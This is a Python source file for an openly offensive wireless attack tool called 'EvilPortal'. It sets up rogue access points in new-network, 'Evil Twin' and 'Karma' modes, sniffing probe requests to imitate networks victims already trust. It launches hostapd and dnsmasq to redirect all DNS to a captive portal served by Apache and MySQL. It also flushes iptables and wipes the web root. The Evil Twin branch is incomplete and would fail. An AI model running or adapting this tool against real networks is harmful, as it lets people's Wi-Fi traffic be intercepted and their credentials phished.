import os, re, random, requests, time, signal

tempFolder = '/tmp/evilportal'

def title():
    ret = '\n'
    ret += '███████╗██╗   ██╗██╗██╗     ██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗     \n'
    ret += '██╔════╝██║   ██║██║██║     ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║     \n'
    ret += '█████╗  ██║   ██║██║██║     ██████╔╝██║   ██║██████╔╝   ██║   ███████║██║     \n'
    ret += '██╔══╝  ╚██╗ ██╔╝██║██║     ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║     \n'
    ret += '███████╗ ╚████╔╝ ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗\n'
    ret += '╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝\n'
    ret += '                                                       By: hacefresko         \n'

    return ret

class networkInterfaces:

    # Here we find directories representing current network interfaces named after them
    netIntDir = '/sys/class/net'

    dnsmasqLogFile = 'dnsmasq.log'
    hostapdLogFile = 'hostapd.log'

    def __init__(self):
        self.interfaces = []

        for dirpath, interfaces, filenames in os.walk(self.netIntDir):
            for interface in interfaces:
                if re.match(r'wlan\d', interface):
                    # Directory /sys/class/net/<interface>/type contains 
                    # the mode in which the interface is operating:
                    #   1   -> managed
                    #   803 -> monitor
                    #
                    f = open(self.netIntDir + '/' + interface + '/type', 'r')
                    if f.read() == '803\n':
                        self.interfaces.append({'name' : interface, 'mode' : 'monitor'})
                    else:
                        self.interfaces.append({'name' : interface, 'mode' : 'managed'})
                    f.close()

    def __repr__(self):
        ret = '\nNETWORK INTERFACES\n\n'

        i = 1
        for interface in self.interfaces:
            if interface['mode'] == 'monitor':
                ret += '[{}] -> {} ({})\n'.format(i, interface['name'], interface['mode'])
            else:
                ret += '[{}] -> {}\n'.format(i, interface['name'])
            i = i + 1
            
        return ret

    def putInMonitor(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]

        if interface['mode'] == 'monitor':
            print('[x] Selected interface is already in monitor mode!\n')
            return -1
        
        print('[-] Configuring network interface...')

        os.system('ifconfig ' + interface['name'] + ' down')
        os.system('iw ' + interface['name'] + ' set type monitor')
        os.system('ifconfig ' + interface['name'] + ' up')

        f = open(self.netIntDir + '/' + interface['name'] + '/type', 'r')
        if f.read() != '803\n':
            print('[x] Newtork interface couldn\'t be put in monitor mode!\n')
            f.close()
            return -1
        f.close()
        print('[+] Network interface configured succesfuly')
        
        return 0

    def launchHostapd(self, nInterface, ssid, channel, encryption):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]['name']
        
        # Hostapd configuration
        hostapdConfig = ''
        hostapdConfigFile = 'hostapd.conf'

        print('[-] Configuring hostapd...')
        if encryption == 'OPEN':
            hostapdConfig += 'interface=' + interface + '\n'
            hostapdConfig += 'driver=nl80211\n'
            hostapdConfig += 'ssid=' + ssid + '\n'
            hostapdConfig += 'hw_mode=g\n'
            hostapdConfig += 'channel=' + channel + '\n'
            hostapdConfig += 'macaddr_acl=0\n'
            hostapdConfig += 'auth_algs=1\n'
            hostapdConfig += 'ignore_broadcast_ssid=0\n'

        elif encryption == 'WPA2':
            password = input('\nWifi password [more than 8 chars]> ')
            print()

            hostapdConfig += 'interface=' + interface + '\n'
            hostapdConfig += 'driver=nl80211\n'
            hostapdConfig += 'ssid=' + ssid + '\n'
            hostapdConfig += 'hw_mode=g\n'
            hostapdConfig += 'wpa=2\n'
            hostapdConfig += 'wpa_passphrase=' + password + '\n'
            hostapdConfig += 'wpa_key_mgmt=WPA-PSK\n'
            hostapdConfig += 'wpa_pairwise=TKIP\n'
            hostapdConfig += 'rsn_pairwise=CCMP\n'
            hostapdConfig += 'channel=' + channel + '\n'
            hostapdConfig += 'macaddr_acl=0\n'
            hostapdConfig += 'auth_algs=3\n'
            hostapdConfig += 'ignore_broadcast_ssid=0\n'

        f = open(os.path.join(tempFolder, hostapdConfigFile), 'w')
        f.write(hostapdConfig)
        f.close()

        # Hostapd initialization
        os.system('hostapd ' + os.path.join(tempFolder, hostapdConfigFile) + ' > ' + os.path.join(tempFolder, self.hostapdLogFile) + ' &')
        print('[+] hostapd succesfuly configured')
        
        return 0

    def launchDnsmasq(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]['name']

        # Stop dnsmasq daemon in case it's active
        os.system('service dnsmasq stop')

        # Config dnsmasq
        dnsmasqConfig = ''
        dnsmasqConfigFile = 'dnsmasq.conf'
        dnsmasqHostsFile = 'hosts'

        print('[-] Configuring dnsmasq...')

        dnsmasqConfig += 'interface=' + interface + '\n'                        # Interface in which dnsmasq listen
        dnsmasqConfig += 'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
        dnsmasqConfig += 'dhcp-option=3,10.0.0.1\n'                             # Set router to 10.0.0.1
        dnsmasqConfig += 'dhcp-option=6,10.0.0.1\n'                             # Set dns server to 10.0.0.1
        dnsmasqConfig += 'log-queries\n'                                        # Log all queries
        dnsmasqConfig += 'address=/#/10.0.0.1\n'                                # Response to every DNS query with 10.0.0.1 (where our captive portal is)

        f = open(os.path.join(tempFolder, dnsmasqConfigFile), 'w')
        f.write(dnsmasqConfig)
        f.close

        # Configures dnsmasq to assign the interface ip to the domain name so mod_rewrite
        # (.htaccess) can reffer directly to the domain name in the URL
        f = open(os.path.join(tempFolder, dnsmasqHostsFile), 'w')
        f.write('10.0.0.1 wifiportal2.aire.es')
        f.close()

        # Set inet address of interface to 10.0.0.1
        os.system('ifconfig ' + interface + ' 10.0.0.1')

        # Initialize dnsmasq
        os.system('dnsmasq -C ' + os.path.join(tempFolder, dnsmasqConfigFile) + ' -H ' + os.path.join(tempFolder, dnsmasqHostsFile) + ' --log-facility=' + os.path.join(tempFolder, self.dnsmasqLogFile))

        print('[+] dnsmasq succesfuly configured')

        return 0

    def sniffProbeReq(self, nInterface, sigint_handler):
        tcpdumpLogFile = 'tcpdump.log'
        tcpdumpFD = 0
        probeRequests = []

        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        # We need to create the file before reading it, as tcpdump
        # may delay a few miliseconds until it creates it it self
        f = open(os.path.join(tempFolder, tcpdumpLogFile), 'w+')
        f.close()

        os.system('tcpdump -l -e -i' + self.interfaces[nInterface]['name'] + ' type mgt subtype probe-req>' + os.path.join(tempFolder, tcpdumpLogFile) + ' 2>&1 &')

        tcpdumpFD = open(os.path.join(tempFolder, tcpdumpLogFile), 'r')

        # stop is defined as global for the sigint handler to be able to get it
        global stop
        stop = False

        def sigint_handler_probe(sig, frame):
            global stop
            stop = True
            signal.signal(signal.SIGINT, sigint_handler)
        
        signal.signal(signal.SIGINT, sigint_handler_probe)

        print('PROBE REQUESTS (Ctrl C to stop)')
        while not stop:
            line = tcpdumpFD.readline()
            if line:
                client = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
                ap = re.findall(r'[(](.+?)[)]', line)
                if client and len(ap) == 2:
                    newProbeRequest = {'client' : client.group(), 'ap' : ap[1]}
                    try:
                        probeRequests.index(newProbeRequest)
                        inList = True
                    except ValueError:
                        inList = False
                    
                    if not inList:
                        probeRequests.append(newProbeRequest)
                        #print(probeRequests)
                        print('[' + str(len(probeRequests)) + '] ' + client.group() + ' -> ' + ap[1])

            time.sleep(1)
        
        tcpdumpFD.close()
        os.system('pkill tcpdump')
        print()
        
        probeRequest = -1
        while probeRequest < 0 or probeRequest >= len(probeRequests):
            probeRequest = int(input('Select probe request to mirror > ')) - 1

            if probeRequest < 0 or probeRequest >= len(probeRequests):
                print('[x] Input out of bounds!')
            else:
                return probeRequests[probeRequest]

# We define the file descriptors for hostapd log file and dnsmasq log file
# as global in order for the sigint handler to be able to get them
hostapdFD = 0
dnsmasqFD = 0
def sigint_handler(sig, frame):
    print('\n[x] SIGINT: Exiting...')
    os.system('pkill hostapd')
    os.system('pkill dnsmasq')

    os.system('rm -r ' + tempFolder + ' 2>/dev/null')

    global hostapdFD
    global dnsmasqFD

    if hostapdFD != 0:
        hostapdFD.close()

    if dnsmasqFD != 0:
        dnsmasqFD.close()

    quit()

signal.signal(signal.SIGINT, sigint_handler)

print(title())

# Check for root priviledges
if os.getuid() != 0:
    print('[x] Please, run program as root!\n')
    quit()

networkInterfaces = networkInterfaces()

# Select network interface
if len(networkInterfaces.interfaces) == 0:
    print('[x] No network interface detected!\n')
    quit()

elif len(networkInterfaces.interfaces) == 1:
    if networkInterfaces.interfaces[0]['mode'] != 'monitor':
        if networkInterfaces.putInMonitor(0) != 0:
            quit()
    interface = 0

elif len(networkInterfaces.interfaces) > 1:
    ok = -1
    while ok != 0: 
        print(networkInterfaces)
        interface = int(input('Select network interface > ')) - 1
        print()
        if interface < 0 or interface >= len(networkInterfaces.interfaces): 
            print('[x] Input value out of bounds!')
        else:
            if networkInterfaces.interfaces[interface]['mode'] != 'monitor':
                ok = networkInterfaces.putInMonitor(interface)
            else:
                ok = 0

print('[+] Network Interface in use: ' + networkInterfaces.interfaces[interface]['name'])

# Create temp folder
try:
    os.makedirs(tempFolder)
except OSError:
    print('[-] Temporal directory ' + tempFolder + ' already exists')

# Flush iptables to avoid conflicts
print ('[-] Flushing iptables...')
os.system('iptables -F')
os.system('iptables -t nat -F')
print('[+] Iptables flushed')

# Select operation mode
op = -1
while op < 1 or op > 3:
    print('\nOPERATION MODE')
    print('[1] -> Create new acces point')
    print('[2] -> [Evil Twin] Intercept existing access point')
    print('[3] -> [Karma] Create acces point recogniced by victim')
    op = int(input('Select operation mode > '))
    print()

    if op == 1:
        deauth = False
        ssid = input('WiFi SSID > ')
        channel = input('Channel > ')

        encr = -1
        print('\nSecurity:')
        while encr < 1 or encr > 2:
            print('[1] -> Open')
            print('[2] -> WPA2')
            encr = int(input(' > '))
            if encr < 1 or encr > 2:
                print('[x] Input value out of bounds!\n')
            elif encr == 1:
                encryption = "OPEN"
            elif encr == 2:
                encryption = "WPA2"
        print()

    elif op == 2:
        deauth = True

    elif op == 3:
        deauth = False
        probeRequest = networkInterfaces.sniffProbeReq(interface, sigint_handler)
        ssid = probeRequest['ap']
        channel = input('Channel > ')

        encr = -1
        print('\nSecurity:')
        while encr < 1 or encr > 2:
            print('[1] -> Open')
            print('[2] -> WPA2')
            encr = int(input(' > '))
            if encr < 1 or encr > 2:
                print('[x] Input value out of bounds!\n')
            elif encr == 1:
                encryption = "OPEN"
            elif encr == 2:
                encryption = "WPA2"
        print()


    else:
        print('[x] Input value out of bounds!\n')


# Launch hostapd
networkInterfaces.launchHostapd(interface, ssid, channel, encryption)

# Launch dnsmasq
networkInterfaces.launchDnsmasq(interface)

# Config captive portal files
os.system('rm -r /var/www/html/* 2>/dev/null')
os.system('cp -r captive /var/www/html/captive')
os.system('cp .htaccess /var/www/html')
os.system('chmod 755 /var/www/html/.htaccess')
os.system('chmod 755 /var/www/html/captive')
os.system('chmod 755 /var/www/html/captive/*')

# Enable rewrite and override for .htaccess and php
print('[-] Configuring apache2...\n')
os.system('cp -f override.conf /etc/apache2/conf-available/')
os.system('a2enconf override')
os.system('a2enmod rewrite')
os.system('a2enmod php7.3')

# Reload/restart apache2 and start mysql (mariaDB)
os.system('service apache2 reload')
os.system('service apache2 restart')
print('\n[+] apache2 configured succesfuly')
print('[-] Configuring mysql...')
os.system('service mysql start')
print('[+] mysql configured succesfuly')

# Print hostapd + dnsmasq
hostapdFD = open(os.path.join(tempFolder, networkInterfaces.hostapdLogFile), 'r')
dnsmasqFD = open(os.path.join(tempFolder, networkInterfaces.dnsmasqLogFile), 'r')
prev = ''
while True:
    hostapdLog = hostapdFD.read()
    if hostapdLog:
        if prev != 'hostapd':
            print('\n[HOSTAPD]')
        print(hostapdLog, end = '')
        prev = 'hostapd'

    dnsmasqLog = dnsmasqFD.read()
    if dnsmasqLog:
        if prev != 'dnsmasq':
            print('\n[DNSMASQ]')
        print(dnsmasqLog, end = '')
        prev = 'dnsmasq'

    time.sleep(1)

